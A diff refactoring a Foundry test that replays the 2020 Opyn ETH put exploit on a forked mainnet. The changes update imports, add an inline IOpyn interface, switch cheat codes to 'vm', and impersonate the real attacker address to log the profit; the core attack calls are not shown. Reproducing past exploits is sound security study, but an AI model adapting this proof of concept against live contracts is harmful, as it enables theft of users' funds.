@@ -1,8 +1,8 @@
 // SPDX-License-Identifier: UNLICENSED
-pragma solidity 0.8.17;
+pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
+import {IUSDC} from "src/interfaces/IUSDC.sol";
 
 /*
 @Analysis 
@@ -11,22 +11,33 @@ https://medium.com/opyn/opyn-eth-put-exploit-post-mortem-1a009e3347a8
 @Transaction
 0x56de6c4bd906ee0c067a332e64966db8b1e866c7965c044163a503de6ee6552a*/
 
-contract ContractTest is Test {
+interface IOpyn {
+    function addERC20CollateralOption(
+        uint256 amtToCreate,
+        uint256 amtCollateral,
+        address receiver
+    ) external;
 
+    function exercise(
+        uint256 oTokensToExercise,
+        address payable[] memory vaultsToExerciseFrom
+    ) external payable;
+
+    function removeUnderlying() external;
+}
+contract ContractTest is Test {
     IOpyn opyn = IOpyn(0x951D51bAeFb72319d9FBE941E1615938d89ABfe2);
 
     address attacker = 0xe7870231992Ab4b1A01814FA0A599115FE94203f;
 
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-
     IUSDC usdc = IUSDC(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
 
     function setUp() public {
-        cheats.createSelectFork("mainnet", 10_592_516); //fork mainnet at block 10592516
+        vm.createSelectFork("mainnet", 10_592_516); //fork mainnet at block 10592516
     }
 
     function test_attack() public {
-        cheats.startPrank(attacker);
+        vm.startPrank(attacker);
 
         uint256 balBefore = usdc.balanceOf(attacker) / 1e6;
         console.log("Attacker USDC balance before is    ", balBefore);
@@ -50,7 +61,9 @@ contract ContractTest is Test {
 
         uint256 balAfter = usdc.balanceOf(attacker) / 1e6;
         console.log("Attacker USDC balance after is     ", balAfter);
-        console.log("Attacker profit is                  ", balAfter - balBefore);
+        console.log(
+            "Attacker profit is                  ",
+            balAfter - balBefore
+        );
     }
-
 }
